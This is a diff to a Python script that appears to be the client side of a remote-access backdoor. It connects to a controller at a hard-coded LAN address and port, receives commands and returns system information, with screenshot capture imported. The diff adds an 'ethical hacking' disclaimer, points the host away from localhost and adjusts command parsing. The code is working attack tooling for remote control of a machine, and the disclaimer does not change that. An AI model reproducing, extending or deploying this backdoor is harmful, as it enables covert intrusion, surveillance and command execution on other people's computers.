@@ -1,3 +1,9 @@
+# --- ETHICAL HACKING PROJECT DISCLAIMER ---
+# This code is for educational and ethical hacking purposes only.
+# The author is not responsible for any illegal use or damage caused by this software.
+# Use it only on systems you own or have explicit permission to test.
+# ------------------------------------------
+
 import os
 import platform
 import socket
@@ -5,7 +11,7 @@ import time
 import subprocess
 from PIL import ImageGrab
 
-HOST_IP = "127.0.0.1"
+HOST_IP = "192.168.1.146"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
@@ -27,7 +33,12 @@ while True:
         break
     command = command_data.decode()
     print(f"Command : {command}")
-    command_split = command.split(' ')
+    
+    command_split = command.split(' ', 1)
+    if len(command_split) == 2:
+        command_split[1] = command_split[1].strip('"').strip("'")
+
+ 
     if command_split[0] == "info":
         respond = platform.platform() + " " + os.getcwd()
         respond = respond.encode()
